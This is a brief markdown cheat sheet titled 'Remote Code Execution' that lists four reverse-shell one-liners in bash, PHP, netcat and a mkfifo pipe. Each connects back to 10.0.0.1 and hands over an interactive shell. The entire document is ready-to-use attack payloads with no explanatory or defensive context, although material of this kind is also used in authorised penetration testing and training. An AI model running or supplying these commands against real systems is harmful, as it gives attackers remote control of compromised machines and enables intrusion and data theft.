# Remote Code Execution

## Get Reverse Shell
  - bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
  - php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
  - nc -e /bin/sh 10.0.0.1 1234
  - rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f 
